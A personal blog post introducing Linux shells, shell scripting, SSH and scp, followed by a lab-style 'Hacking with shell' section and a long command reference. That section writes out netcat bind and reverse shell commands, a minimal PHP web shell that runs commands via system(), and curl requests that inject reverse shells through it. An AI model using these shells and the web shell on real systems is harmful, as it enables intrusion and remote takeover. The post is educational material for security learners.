---
title: "Shell and something else"
description: "Shell and something else"
summary: "Shell and something else"
categories: ["Research"]
tags: ["Shell", "Terminal", "Web"]
#externalUrl: ""
date: 2025-02-02
draft: false
cover: ../../post/shell/feature.png
authors:
  - winky
---

## Introduction

One day, I wanted to transfer some files between two computers, but it took a long time. Another solution I considered was Google Drive, but it only provides 15GB of storage, which is not enough 😢. This made me to think about file transfer over a TCP connection. To do this securely and quickly, I would need to use the shell to connect the two machines using Secure Shell (SSH) in order to transfer files faster and more securely. On the other hand, after giving a period of time playing CTF (Capture The Flag) with some challenges about shell, I write this blog to jot down some of my research about it.

![image](https://hackmd.io/_uploads/BJpYzdjOke.png)

## All things about shell

### Shell

So let talk a bit about the architecture of Linux

![image](https://hackmd.io/_uploads/SkJ5vrQ_Jx.png)

In the above picture, shell is the part between our commands like vi, cd, a.out,… or some applications to the kernel. It wraps around the kernel and acts as a command-line interpreter, reading commands from the keyboard or a file and executing them. The shell is invoked when the user logs in or when the terminal is started.

Shell is broadly classified into two categories :

* Command-line shells (CLI)
* Graphical shells (GUI)

#### Command-line shells

Shell can be accessed by users using a command line interface by a special application like Terminal in Linux/macOS, or Command Prompt in Windows OS. It is given for typing the human-readable commands like “cat”, “ls” etc., and then executing it. Finally, the result is printed to the user in the terminal. This is how a terminal in Kali Linux 2024.4 system looks like 

![image](https://hackmd.io/_uploads/B14kFBQdyl.png)

The above screenshot demonstrates executing “ls” command with “-l” option. So it will show every file within the current working directory in long listing. You also use other  command in PowerShell of Windows OS but give the same result like

![image](https://hackmd.io/_uploads/B1WohjjOyx.png)

It’s bit hard for beginners to work with a command-line shell because of having to memorize many commands. Many solutions for working with command lines are packaging all the commands in a file and run it. It is a very powerful tool that lets users store commands in a file and run them all at once. In this manner automating any repetative task gets pretty straightforward. These files are usually called batch files in Windows and Shell Scripts in Linux/macOS systems.

#### GUI shells

Using graphical shells, the user can drive programs by means of the GUI (graphical user interface), like opening, closing, moving, and resizing windows, and switching focus between windows. Window OS or Ubuntu OS is a good example for this (provides GUI to the user to interact with the program). Every activity does not require users to enter commands. A typical GUI in the Kali Linux system looks like

![image](https://hackmd.io/_uploads/r1nhaRQdkx.png)

#### Terminals

The Linux terminal is application software that runs on commands. This text-based app provides a command-line interface (CLI) to control & perform operations on Linux computers. The "terminal" is one of the most widely-used tools all Linux operating systems deliver as a default application. It helps Linux users accomplish almost all processes in the most effective way possible. When the successor of Linux, i.e., Unix, got developed, there was no GUI. All the operations, like opening a file, creating a file, etc., get performed using the command-line interface. We can install programming languages or write scripts using the Linux terminal. Since Linux terminal also works on servers and remote computers, server, and network administrators do not have to learn new ways separately to operate them.

Here is a list of well-known terminal emulators users prefer installing in their operating systems.

* Windows: Windows Terminal (CMD), PuTTy, ConEmu, etc.
* Mac OS X: Terminal (that comes by default), iTerm, etc.
* Linux: Gnome Terminal, Konsole, XTerm, etc.

![image](https://hackmd.io/_uploads/B1365Sm_1e.png)

Although all these terminal emulators have their features, these latest terminal emulators come with highlighted text features and tabbed windows. Here is Warp terminal with AI commands support :

![image](https://hackmd.io/_uploads/B1CZae9Oyl.png)

### Some shells in linux

There are many types of shells that you can use for daily works such as C Shell, Korn Shell, T Shell, ...Each shell does the same job but understands different commands and provides different built-in functions so I just talk about some popular shell today.

#### Bourne Shell

`Denoted as 'sh'`

It is the original UNIX shell so it is fastest among type of shells. Having said that, it lacks features for interactive use like the ability to recall previous commands. It also lacks built-in arithmetic and logical expression handling.

![image](https://hackmd.io/_uploads/SkYw39GOye.png)

However, it stills be a choice for hacking in case of other shells are sanitized

#### GNU Bourne-Again shell

`Denoted as 'bash'`

It includes features from Korn and Bourne shell. 

![image](https://hackmd.io/_uploads/Sy6q6qG_Jg.png)

As you can see, it is more colorful than a previous one. You can use arrow key to call the previous command and you can see all the bash history at ~/.bash_history. Bash also have the config files place as ~/.bashrc. This file is used to define a function that you can use to call some command line and reduce redundant efforts.for example we can add a function

![image](https://hackmd.io/_uploads/BJFGyjz_kl.png)

#### Z Shell

`Denoted as 'zsh'`

Z Shell is my favorite shell. It is an extended version of the Bourne-Again Shell (bash), with additional features and capabilities.

![image](https://hackmd.io/_uploads/HyGYWofO1g.png)

Zsh is somthing like an advanced version of bash so it contains all of bash feature like it has .zshrc and .zsh_history. Moreover, we can install some zsh extensions such as [zsh-autosuggestions](https://github.com/zsh-users/zsh-autosuggestions) or [zsh-syntax-highlighting](https://github.com/zsh-users/zsh-syntax-highlighting). The thing that makes zsh become the best shell is it has a large theme collection. We can configure zsh with oh-my-zsh to this

![image](https://hackmd.io/_uploads/HJVc6ecuyg.png)

With daily work, I prefer to use zsh since it is the most colorful shell we can use and have the large amount of features.

![](https://hackmd.io/_uploads/Hk5pxjfd1g.jpg)

### Shell scripting

So, we're gonna get into shell scripting, which, of course is the most fundamental thing every user working in Linux needs to automate the command line. Usually, Shells are interactive; meaning, they accept commands as input from users, which then executes. However, at times we intend to execute some bunch of routine commands, where we have to write all of the commands at each and every step in a terminal.

![image](https://hackmd.io/_uploads/r16QSjGdkl.png)

As a shell can also take commands as input from file, we can write these commands in a file and can execute them in shell to avoid this repetitive work. These files are called Shell Scripts or Shell Programs. Shell scripts are similar to the batch file in MS-DOS. Each shell script is saved with `.sh` file extension e.g., script.sh. A shell script has syntax just like any other programming language. If you have any prior experience with any programming language like Python, C/C++ etc. It would be very easy to get started with it.

A shell script comprises the following elements :

* Shell Keywords : if, else, break etc.
* Shell commands : cd, ls, echo, pwd, touch etc.
* Functions - Control flow : if..then..else, case and shell loops etc.

Instead of write a single line command we can package it in a file with .sh file extension like this

![image](https://hackmd.io/_uploads/ByV0Hif_Jl.png)

Oh yes it is something like writing some Python code and run it. But you can package some linux commands to install a bunch of software thereby saving time when you reinstall those programs on another computer.

### Secure shell

#### What is secure shell (SSH) ?

Imagine a system administrator working from home who needs to manage a remote server at a company data center. Without SSH, they would have to worry about their login credentials being intercepted, leaving the server vulnerable to hackers. Instead of it after using SSH, the administrator establishes a secure connection that encrypts all data sent over the internet. They can now log in with their username and a private key, allowing them to safely execute commands on the server, transfer files, and make necessary updates, all of these without the risk of spying eyes watching their actions. 
This secure access is essential for maintaining the integrity of sensitive information of the company. SSH (Secure Shell) is an access credential that is used in the SSH Protocol. In other words, it is a cryptographic network protocol that is used for transferring encrypted data over the network.

![image](https://hackmd.io/_uploads/HJ5sR8id1l.png)

Features of SSH
* Encryption: Encrypted data is exchanged between the server and client, which ensures confidentiality and prevents unauthorized attacks on the system.
* Authentication: For authentication, SSH uses public and private key pairs which provide more security than traditional password authentication.
* Data Integrity: SSH provides Data Integrity of the message exchanged during the communication.
* Tunneling: Through SSH we can create secure tunnels for forwarding network connections over encrypted channels.

#### How it works ?

Or more specifically, how does SSH ensure that data transmitted between two computers is encrypted so that only one of the two computers can decrypt it? To do this, there are two major techniques used in SSH, which are

* Symmetric encryption: In Symmetric-key encryption the message is encrypted by using a key and the same key is used to decrypt the message which makes it easy to use but less secure. It also requires a safe method to transfer the key from one party to another which is asymmetric encryption used in SSH i will introduced later. It just something like you rar-compress a folder and lock it, after that you send it with the password and only the receiver who have the password is able to unrar it. In Symmetric encryption, this password called secret key but it can be cracked or leaked by the hacker so it it quite insecure and SSH used Asymetric encryption to transfer it.

![image](https://hackmd.io/_uploads/SkZwR8iukg.png)


* Asymetric encryption : This type of encryption allows only the receiver is able to open and read the encrypted data. Imagine that you have two keys are public key and private key which are generated by RSA algorithm. Firstly, you send the public key to the other computer you want to communicate with.

![image](https://hackmd.io/_uploads/r1fOqUjuJl.png)

Next, the reciever can use this public key to encrypt the data but cannot decrypt or read it themselves.

![image](https://hackmd.io/_uploads/B1lKjIid1x.png)

Finally, only the owner of the corresponding private key can decrypt the data, ensuring that hackers cannot access its contents.

![image](https://hackmd.io/_uploads/H17ohLjd1g.png)

To provide secure and private communication over the internet, asymmetric encryption is commonly employed in a variety of communication methods, including messaging apps, digital signatures, and file encryption.

#### Example of SSH

Setting up SSH on Linux may be necessary, as some distributions don’t come with it pre-installed. Installing OpenSSH, a widely used SSH implementation, or opting for a graphical user interface (GUI) solution like the PuTTY client for Ubuntu can address this. Here’s a step-by-step guide on installing and configuring OpenSSH on both the client and server sides:

* For Debian/Ubuntu-based Systems, open the terminal and run:

`sudo apt install openssh-client openssh-server`

* For Windows system, you can find how to install on this link : https://woshub.com/connect-to-windows-via-ssh/

The basic syntax for using the SSH command is as follows:

`ssh [username]@[hostname or IP address]`

Most commonly used Options in ssh command in Linux.

|Options| Description|
|-|-|
-1| Use protocol version 1 only.
-2| Use protocol version 2 only.
-4| Use IPv4 addresses only.
-6| Use IPv6 addresses only.
-A |Enable forwarding of the authentication agent connection.
-a |Disable forwarding of the authentication agent connection.
-C |Use data compression
-c cipher_spec |Selects the cipher specification for encrypting the session.
-D [bind_address:]port |Dynamic application-level port forwarding. This allocates a socket to listen to port on the local side. When a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.
-E log_file |Append debug logs to log_file instead of standard error.
-F configfile |Specifies a per-user configuration file. The default for the per-user configuration file is ~/.ssh/config.
-g |Allows remote hosts to connect to local forwarded ports.
-i identity_file |A file from which the identity key (private key) for public key authentication is read.
-J [user@]host[:port] |Connect to the target host by first making a ssh connection to the pjump host[(/iam/jump-host) and then establishing a TCP forwarding to the ultimate destination from there.
-l login_name |Specifies the user to log in as on the remote machine.
-p port |Port to connect to on the remote host.
-q |Quiet mode.
-V |Display the version number.
-v |Verbose mode.
-X |Enables X11 forwarding.

For example : 

![image](https://hackmd.io/_uploads/HkwMmPiuJl.png)

The above command require the password of the user of the server that the client wants to connect. This may be insecured so we can ssh with public and private key. Firstly we generated a pair of public and private key by RSA algorithm with the below command.

![image](https://hackmd.io/_uploads/BkGc8Pj_ye.png)

We can see that after generated, we have two files called id_rsa and id_rsa.pub so we can send the id_rsa.pub as the public key to the server and add it to authorized keys like this

![image](https://hackmd.io/_uploads/rJIrDwjdkl.png)

Now in the client user, we can use the id_rsa file with the passphrase we use for generating two files to connect to the server with -i option.

![image](https://hackmd.io/_uploads/HkjLPvju1g.png)

SSH using PuTTy in Windows OS or Linux, you can download it at https://www.putty.org/

![image](https://hackmd.io/_uploads/rk6rbno_kx.png)

After log in we can use other machine like normal secure shell

![image](https://hackmd.io/_uploads/rJ3db3sdJl.png)

#### Secure copy

Secure copy or scp command in Linux system is used to copy files between servers in a secure way. The SCP command or secure copy allows the secure transferring of files between the local host and the remote host or between two remote hosts. It uses the same authentication and security as it is used in the Secure Shell (SSH) protocol. SCP is known for its simplicity, security, and pre-installed availability.

The basic syntax for using the SSH command is as follows:

`scp [file_name]  remoteuser@remotehost:/remote/directory`

Moreover, you can transfer file from the remote server to the client with the below command

`scp user@remotehost:/home/user/file_name`

Or transfer between two different remote servers: 

`scp remoteuser@remotehost1:/remote/directory  remoteuser@remotehost2:/remote/directory`

Most commonly used options in scp command in Linux.

|Options |	Description|
|-|-|
-P|	port: Specifies the port to connect on the remote host.
-p|	 Preserves modification times, access times, and modes from the original file.
-q|	 Disables the progress meter.
-r|	 Recursively copy entire directories.
-s|	 Name of program to use for the encrypted connection. The program must understand ssh(1) options.

For example : 

![image](https://hackmd.io/_uploads/r1GOKwoukl.png)

{%< alert >%}

Note: For large files or folders, you can compress them using formats like tar, 7z, or zip before sending them to achieve the fastest transfer speed.

{%< /alert >%}



## Hacking with shell

{%< alert  cardColor="#c4921d" textColor="#ffffff" >%}
All thing below are just for reference, not persuading to do something illegal.
{%< /alert >%}

Now, you may ask what does this have to do with ethical hacking. In ethical hacking, a hacker or pentester gains access to a machine, the first thing he tries to gain access to on the target system is a shell. There are two types of shells in hacking and cyber security are Bind shell and Reverse shell.

![image](https://hackmd.io/_uploads/S172OQzu1g.png)

So before we go to those methods we should know the netcat or nc is a utility tool that uses TCP and UDP connections to read and write in a network. It can be used for both attacking and security. In the case of attacking. It helps us to debug the network along with investigating it. It runs on all operating systems with the following options.

|Options|Description|
|-|-|
-l| listen mode, for inbound connects
-n| numeric-only IP addresses, no DNS
-v| verbose
-p| port
-e| filename             program to exec after connect
-c| shell commands       as '-e'; use /bin/sh to exec 



### Bind shell

A bind shell is applicable when the attacker’s machine is able to connect directly to the target machine. In that aspect, the target machine is listening to some port for incoming connections, and control is given to the attacking machine upon connection to that port.. For example, we have two machines with Linux OS like this :

![image](https://hackmd.io/_uploads/BJpA6Xfukg.png)

In a bind shell, the victim's machine creates a listening service on a specific port and waits for a connection. To do this using Netcat (nc), we run the following command on the victim's machine which is running Debian like this :

`nc -lvnp 4444 -e /bin/bash`

![image](https://hackmd.io/_uploads/rkdTt7GuJl.png)

Once the victim’s machine is listening, an attacker can connect to it remotely by running the following command from their system:

`nc 192.168.1.21 4444`

![image](https://hackmd.io/_uploads/HJdD5mzdJg.png)

As soon as this command is executed, the attacker gains a fully interactive shell on the victim’s machine, allowing them to execute commands remotely. More payloads to open TCP port to listen are available on this link : 

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#python

With Python, we also be able to open a port to listen and perform bind shell 

![image](https://hackmd.io/_uploads/BJ2QiQM_Jl.png)

A bind shell allows remote access by making the victim machine listen for incoming connections. However, because it relies on open ports, it is often blocked by firewalls, making reverse shells a more common method for bypassing security.

### Reverse shell

So we now know about how to connect from the server from the but if firewall or some secured methods are activated on the server. How can we still establish a connection in such cases?

One of the ways to get around this is by making use of a reverse shell. In a reverse shell, the shell is originated from the target system-that is, the victim machine-and connects back to a listening port on the attacker's machine. It is pretty well known among attackers as one of the ways to bypass firewalls, since in this method, the outgoing connection from the victim machine is allowed-which is usually not blocked by network security.

![image](https://hackmd.io/_uploads/SJXmIXfu1g.png)

Firstly, we also have two machines run on any OS. We will know the IP address of the machine that we want to attack. In the picture below, the victim machine have the run Debian OS and have IP address 
192.168.1.21

![image](https://hackmd.io/_uploads/r1mxR7Guke.png)

On the attacker's machine (in this case, running Kali Linux), we need to open a listening port that will be ready to accept incoming connections. In this example, we will open port 4444 to allow any machine to connect to it. The following command is used to start the listener on the Kali Linux machine:

`nc -lvnp 4444`

![image](https://hackmd.io/_uploads/rkcBT7zdJx.png)

Now that the attacker's machine is ready to receive a connection, we need to make the victim machine connect to it. On the victim machine (which we assume is running Debian OS with the IP address 192.168.1.21), we will execute the following command to initiate the reverse shell:

`nc 192.168.1.8 4444 -e /bin/bash`

![image](https://hackmd.io/_uploads/S1oXC7fdyl.png)

As soon as this command is executed, the attacker gains a fully interactive shell on the victim’s machine, allowing them to execute commands remotely. More payloads to open TCP port to listen and connect are available on this link : 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

In addition to Netcat, other tools or languages like Python, Bash, and Perl can be used to establish a reverse shell connection. If Netcat is not available on the victim machine, you can use a Python script to achieve the same result. Here is an example of a reverse shell using Python:

![image](https://hackmd.io/_uploads/B1phCXGdke.png)

### Web shell

Web shell is a type of shell that be used on a web for some purposes related to system file, etc. That also allows an attacker to execute commands on a web server through a web application. This is often the result of an improperly secured web server or application that fails to properly sanitize user inputs. Web shells can be used by attackers to remotely execute arbitrary commands on the server, which can lead to full system compromise if the server is not well-secured.

![image](https://hackmd.io/_uploads/Sy_T_XMO1g.png)

For example, consider a basic PHP script hosted on a vulnerable web server that accepts a GET request and executes a Linux command provided by the user. The code might look something like this:

```php
<?php

echo "Your command : " . $_GET["cmd"] . "\n";

echo "Result : " . system($_GET["cmd"]);

?>
```

In this case, the attacker could send a GET request to the vulnerable web application with a specific cmd parameter. For instance, to run a Linux command like ls or cat, the attacker would send a request like the following:

![image](https://hackmd.io/_uploads/B12ze4MOyx.png)

It may lets some attacker to use some shell techniques to manipulate the server like bind shell or reverse shell that I mentioned before. The attacker can use curl to send a GET request to the vulnerable PHP script on the web server with a cmd parameter that starts a bind shell. The command will look like this:

`curl 192.168.1.21/exploit.php?cmd=nc%20-lvnp%204444%20-e%20/bin/bash` 

![image](https://hackmd.io/_uploads/HJE_ZVfdJe.png)

Once the attacker sends this request, the web server will open port 4444 and wait for an incoming connection. The attacker can now connect to this port remotely and have full access to the victim's shell.

To exploit a vulnerable web shell for a reverse shell, the attacker would send a request like this:

`curl 192.168.1.21/exploit.php?cmd=nc%20192.168.1.8%204444%20-e%20/bin/bash`

![image](https://hackmd.io/_uploads/ryalb4zO1g.png)

In this case, the victim machine will connect to the attacker's IP address (192.168.1.8) on port 4444 and establish a reverse shell. The attacker now has access to the victim machine's shell, and they can run commands remotely.



{%< alert >%}
The choice to use a reverse shell or a bind shell will, therefore, be determined by configurations of the network, the firewall, and the extent of access the attacker has to the target machine.
{%< /alert >%}

## Some shell commands

|Command | 	Description	Example Usage|
|-----|:-----:|
|ls |	List the files and directories in the current directory	|
|ls -l|	List files in long format|
|ls -a|	List all files, including hidden files|
|ls -lh|	List files in long format with human-readable file sizes|
|ls -R|	Recursively list all subdirectories|
|||
|cd|	Change the current directory to the user's home directory	|
|cd /path/to/directory|	Change the current directory to a specific directory|
|cd ..	|Move up one level in the directory structure|
|cd -	|Change the current directory to the previous directory|
|||
|mkdir	|Create a new directory	|
|mkdir directory|	Create a directory with the given name in the current directory|
|mkdir -p /path/to/directory	|Create a directory along with its parent directories|
|mkdir -m 777 directory	|Create a directory with the given permissions|
|||
|grep	|Searches for a specific pattern in a file or input	|
|grep "pattern" file.txt	|Search for the pattern in a specific file|
|grep -r "pattern" /path/to/directory	|Search for the pattern in all files in the given directory and its subdirectories|
|||
|touch	|Create a new empty file or update modification and access timestamps of an existing file	|
|touch file.txt|	Create a new empty file with the given name|
|touch -a file.txt|	Update only the access timestamp of the file|
|touch -m file.txt|	Update only the modification timestamp of the file|
|||
|cp	| Copy files and directories	|
|cp file.txt /path/to/destination	|Copy a file to a specific directory|
|cp -r directory /path/to/destination	| Copy a directory to a specific directory|
|cp -a source destination	| Preserve file attributes and permissions while copying|
|cp file1.txt file2.txt /path/to/destination	|Copy multiple files to a specific directory|
|||
|rm	| Delete files and directories	|
|rm file.txt|	Delete a file|
|rm -r directory|	Delete a directory and its contents|
|rm -f file.txt|	Delete a file without prompting for confirmation|
|rm -i file.txt	|Delete a file and prompt for confirmation before deleting|
|||
|mv	|Move or rename files and directories	|
|mv file.txt /path/to/destination	| Move a file to a specific directory|
|mv directory /path/to/destination	| Move a directory to a specific directory|
|mv file.txt newfile.txt	| Rename a file|
|mv -i file.txt /path/to/destination	| Move a file and prompt for confirmation before overwriting|
|||
|pwd	| Show the current working directory	|
|pwd	| Show the current working directory|
|pwd -P	| Show the physical current working directory (all symbolic links resolved)|
|pwd -L	|Show the logical current working directory (the path without symbolic links)|
|cat	|Concatenate and display the contents of files	|
|cat file1	Display the contents of file1|
|||
|cat file1 file2 file3 |	Display the contents of file1, file2 and file3|
|cat file1 > newfile	|Redirect the contents of file1 to create a new file named newfile|
|cat file1 >> existingfile|	Append the contents of file1 to an existing file named existingfile|
|less	|View the contents of a file one screen at a time	|
|less file1	|View the contents of file1 one screen at a time|
|less +10 file1|	Start viewing the contents of file1 from line number 10|
|||
|ls -l \| less | 	Display the output of ls command one screen at a time|
|more	|View the contents of a file one screen at a time	|
|more file1	|View the contents of file1 one screen at a time|
|more +10 file1|	Start viewing the contents of file1 from line number 10|
|ls -l \| more|	Display the output of ls command one screen at a time|
|||
|whoami|	Show the username of the current user	|
|whoami	|Show the username of the current user|
|||
|sudo	|Execute a command as the superuser (root user)	|
|sudo command|	Execute the given command as root user|
|sudo -i	|Log in as the superuser (root user) and execute the shell|
|sudo su	|Switch to the superuser (root user) account|
|||
|find|	Search for files and directories in a directory hierarchy	|
|find directory/ -name "filename"|	Find all files with the given name in the specified directory|
|find directory/ -type f -mtime +7 -delete|	Delete all files in the specified directory that are older than 7 days|
|find directory/ -type d -empty -delete	|Delete all empty directories in the specified directory|
|||
|du	|Estimate file space usage	|
|du -sh *|	Display the total size of all files and directories in the current directory|
|du -sh directory/|	Display the total size of the specified directory|
|du -sh directory/*|	Display the total size of all files and directories in the specified directory|
|||
|head	|Output the first part of files	|
|head file.txt	|Display the first 10 lines of the specified file|
|head -n 20 file.txt	|Display the first 20 lines of the specified file|
|head -c 100 file.txt	|Display the first 100 bytes of the specified file|
|||
|tail	|Displays the last part of a file	|
|tail filename.txt|	Display the last 10 lines of filename.txt|
|tail -n 20 filename.txt|	Display the last 20 lines of filename.txt|
|tail -f filename.txt	|Displays the last 10 lines of filename.txt and waits for new data to be appended to the file|
|||
|tar	|Compresses and archives files	|
|tar -cvf archive.tar file1.txt file2.txt	|Create a tar archive of file1.txt and file2.txt|
|tar -xvf archive.tar	|Extracts the files from archive.tar|
|tar -czvf archive.tar.gz folder	|Create a gzipped tar archive of folder|
|||
|chmod	|Changes the permissions of a file or directory	|
|chmod 777 file.txt|	Gives read, write and execute permissions to the owner, group and others on file.txt|
|chmod u+x file.txt	|Adds executable permission for the owner of file.txt|
|chmod 644 file.txt	|Gives read and write permissions to the owner and read permissions to the group and others on file.txt|
|||
|chown	|Change the ownership of files and directories	|
|chown user:group file	|Change the ownership of a file to a specific user and group|
|chown user:group directory/	|Change the ownership of a directory and its contents to a specific user and group|
|chown -R user:group directory/	|Recursively change the ownership of a directory and its contents to a specific user and group|
|||
|kill	|Terminate running processes	|
|kill process_id	|Terminate a process with the given process ID|
|killall process_name|	Terminate all processes with the given name|
|kill -9 process_id	|Forcefully terminate a process with the given process ID|
|||
|top|	Display and manage running processes	|
|top|	Display a list of running processes, sorted by CPU usage|
|top -u username|	Display a list of running processes for a specific user|
|top -p process_id|	Display information about a specific process with the given process ID|
|||
|htop	|Interactive process viewer	|
|htop	|Display a list of running processes, sorted by CPU usage|
|htop -u username|	Display a list of running processes for a specific user|
|htop -p process_id|	Display information about a specific process with the given process ID|
|||
|ping|	Send ICMP ECHO_REQUEST packets to network hosts	|
|ping hostname|	Send ICMP ECHO_REQUEST packets to the specified hostname or IP address|
|ping -c count hostname|	Send a specified number of packets to the specified hostname or IP address|
|ping -i interval hostname|	Send packets at a specified interval (in seconds) to the specified hostname or IP address|
|||
|wget	|Download files from the web	|
|wget URL	|Download the file at the specified URL|
|wget -O filename URL|	Download the file at the specified URL and save it with the specified filename|
|wget -r URL	|Recursively download all files linked from the specified URL|
|||
|history|	Show a list of previously executed commands	|
|history|	Show the full history of executed commands|
|history n|	Show the last n executed commands|
|||
|man|	Display the manual page for a command	|
|man command|	Display the manual page for the specified command|
|man -k keyword|	Search for manual pages containing the specified keyword|
|||
|zip|	Compress files into a zip archive	|
|zip archive.zip file1 file2 dir1|	Create a new zip archive containing file1, file2, and dir1|
|zip -r archive.zip dir1	|Create a new zip archive containing the contents of dir1 recursively|
|zip -u archive.zip file1	|Add file1 to an existing zip archive or update it if it already exists|
|||
|unzip|	Extract files from a ZIP archive	|
|unzip archive.zip|	Extract all files from the archive|
|unzip archive.zip file.txt|	Extract a specific file from the archive|
|unzip -l archive.zip	|List the contents of the archive|
|||
|echo|	Print a string or value to the terminal	|
|echo "Hello, world!"|	Print the string "Hello, world!" to the terminal|
|echo $PATH	|Print the value of the PATH environment variable to the terminal|
|echo -e "Line 1\nLine 2"|	Print a string with a newline character|
|||
|hostname	|Display the system's hostname	|
|hostname	|Display the system's hostname|
|hostname -I	|Display the system's IP address|
|hostnamectl set-hostname newhostname	|Set the system's hostname to "newhostname"|
|||
|useradd	|Create a new user account	|
|useradd username	|Create a new user account with the given username|
|useradd -m username	|Create a new user account with the given username and create a home directory for the user|
|useradd -g groupname username	|Create a new user account with the given username and add the user to the specified group|
|||
|userdel	|Delete a user account	|
|userdel username	|Delete the user account with the given username|
|userdel -r username	|Delete the user account with the given username and remove the user's home directory and mail spool|
|||
|su	|Switch to another user account	|
|su username	|Switch to the specified user account|
|su -	|Switch to the root user account|
|||
|clear	|Clear the terminal screen	|
|clear	|Clear the terminal screen|
|||
|export	|Set environment variables	|
|export VAR=value	|Set the value of the environment variable VAR to "value"|
|export VAR	|Display the value of the environment variable VAR|
|apt	|Advanced Package Tool	|
|apt update	|Update the package list from the repositories|
|apt upgrade	|Upgrade all installed packages to the latest versions|
|apt install package_name	|Install a package from the repositories|
|apt remove package_name	|Remove a package from the system|
|apt search search_term	|Search for a package in the repositories|
|||
|pacman	|Package manager for Arch Linux	|
|pacman -Sy	|Update the package database|
|pacman -S package_name	|Install a package|
|pacman -Syu	|Upgrade all installed packages|
|pacman -Q	|List all installed packages|
|pacman -R package_name	|Remove a package|
|||
|yum	|Yellowdog Updater Modified	|
|yum install package_name	|Install a package|
|yum remove package_name	|Remove a package|
|yum update	|Update all installed packages|
|yum upgrade package_name	|Upgrade a package to the latest version|
|||
|yay	|Arch Linux package manager (AUR helper)	|
|yay -S package_name	|Install a package from the AUR and its dependencies|
|yay -Syu	|Update all packages in the system including the AUR packages|
|yay -Ss package_name	|Search for a package in the AUR and repositories|
|||
|uname	|Print system information	|
|uname	|Display the name of the current operating system|
|uname -a	|Display all system information, including the kernel version|
|uname -r	|Display the kernel release|
|||
|file	|Determine file type	|
|file filename	|Display the type of the specified file|
|file *	|Display the type of all files in the current directory|
|file -i filename	|Display the MIME type of the specified file|
|||
|date	|Display the current date and time	|
|date '+%A, %B %-d %Y %T %Z'	|Display the date and time in a specific format|
|date '+%s'	|Display the number of seconds since the Unix Epoch|
|||
|cal	|Display a calendar for the current month	|
|cal 2023	|Display a calendar for the year 2023|
|cal 03 2023	|Display a calendar for March 2023|
|||
|uptime	|Display how long the system has been running and the average system load over the past 1, 5, and 15 minutes	|
|uptime -p	|Display the uptime in a more human-readable format|
|||
|curl	|Transfer data from or to a server	|
|curl URL	|Download the content of the URL|
|curl -O URL	|Download the file from the URL and save it with the original name|
|curl -o filename URL	|Download the file from the URL and save it with the specified name|
|||
|wc	|Print newline, word, and byte counts for each file	|
|wc filename	|Print newline, word, and byte counts for the file|
|wc -l filename	|Print only the newline count for the file|
|wc -w filename	|Print only the word count for the file|
|||
|ip	|Show/manipulate routing, network devices, interfaces and tunnels	|
|ip address	|Show IP addresses assigned to network interfaces|
|ip route	|Show the routing table|
|ip link	|Show information about network interfaces|
|||
|dd	|Convert and copy a file, create disk images	|
|dd if=/dev/zero of=/path/to/file bs=1M count=10|	Create a 10MB file filled with zeros|
|dd if=/dev/cdrom of=/path/to/image.iso	|Create an ISO image of a CD/DVD|
|dd if=/dev/sda of=/path/to/image.img bs=1M	|Create an image of a disk|
|||
|ssh	|Secure Shell - Connect to a remote server securely	|
|ssh username@remote_host	|Connect to a remote host as a user named 'username'|
|ssh -p 2222 username@remote_host	|Connect to a remote host on port 2222|
|ssh -X username@remote_host	|Enable X11 forwarding for GUI applications|
|||
|uniq	|Remove duplicate lines from a file	|
|uniq file.txt	|Print the unique lines in a file|
|uniq -c file.txt|	Count the number of occurrences of each line in a file|
|sort file.txt \| uniq|	Remove duplicate lines from a sorted file|
|||
|sort|	Sort lines of text files	|
|sort file.txt|	Sort contents of file.txt in ascending order|
|sort -r file.txt|	Sort contents of file.txt in descending order|
|sort -n file.txt|	Sort contents of file.txt numerically|
|||
|cryptsetup|	Utility for setting up encrypted filesystems	|
|cryptsetup luksFormat /dev/sdb1|	Create an encrypted partition on /dev/sdb1 using LUKS|
|cryptsetup luksOpen /dev/sdb1 myencrypteddisk|	Unlock the encrypted partition /dev/sdb1 and mount it as myencrypteddisk|
|cryptsetup luksClose myencrypteddisk	|Close the encrypted partition named myencrypteddisk|
|||
|mount	|Mount a filesystem	|
|mount /dev/sdb1 /mnt/usb|	Mount the filesystem on /dev/sdb1 to /mnt/usb|
|mount -o remount,rw /mnt/usb|	Remount the /mnt/usb filesystem with read-write permissions|
|mount -t nfs 192.168.1.100:/mnt/nfs /mnt/local|	Mount the NFS share from 192.168.1.100:/mnt/nfs to /mnt/local|
|||
|umount|	Unmount a filesystem	|
|umount /mnt/usb|	Unmount the filesystem mounted on /mnt/usb|
|umount -l /mnt/usb	|Force unmount the filesystem mounted on /mnt/usb (if it is busy)|
|umount -a	|Unmount all currently mounted filesystems|
|||
|fdisk	|Partition table manipulator for Linux	|
|fdisk -l	|List all available disks and partitions|
|fdisk /dev/sdX	|Interactively create a new partition table on /dev/sdX|
|fdisk -l /dev/sdX	|List the partitions on /dev/sdX|
|||
|cfdisk	|Interactive disk partitioning tool	|
|cfdisk /dev/sdX|	Interactively partition /dev/sdX|
|||
|nano	|A friendly, easy-to-use text editor	|
|nano filename|	Edit the file "filename" with nano|
|||
|Ctrl+G	|Show the help screen|
|Ctrl+X	|Exit nano and save changes|
|||
|vi	|A classic, powerful text editor	|
|vi filename	|Edit the file "filename" with vi|
|i	|Enter insert mode to begin editing the file|
|Esc	|Exit insert mode and return to command mode|
|:w	|Save changes to the file|
|:q	|Quit vi|
|:q!	|Force quit vi and discard changes|
|||
|nc	|Network utility for reading from and writing to network connections	|
|nc host port|	Connect to the specified host and port|
|nc -l port	|Listen on the specified port for incoming connections|
|nc -u host port|	Use UDP instead of the default TCP protocol|
|||
|netstat	|Print network connections, routing tables, interface statistics, etc.	|
|netstat -t	|Show TCP connections|
|netstat -u	|Show UDP connections|
|netstat -r	|Show routing table|
|||
|tcpdump	|Packet analyzer for network traffic	|
|tcpdump -i interface	|Listen on the specified network interface|
|tcpdump host ip_address	|Capture packets for the specified host IP address|
|tcpdump -n	|Do not resolve hostnames|
|||
|nmap	|Network exploration tool and security scanner	|
|nmap host	|Scan a single host|
|nmap -sS host	|Perform a stealth SYN scan|
|nmap -O host	|Enable OS detection on the target host|
|||
|awk	|Pattern scanning and processing language	|
|awk '/pattern/ {print $1}' file	|Print the first field of each line that matches a pattern in a file|
|awk '{print $1, $3}' file	|Print the first and third fields of each line in a file|
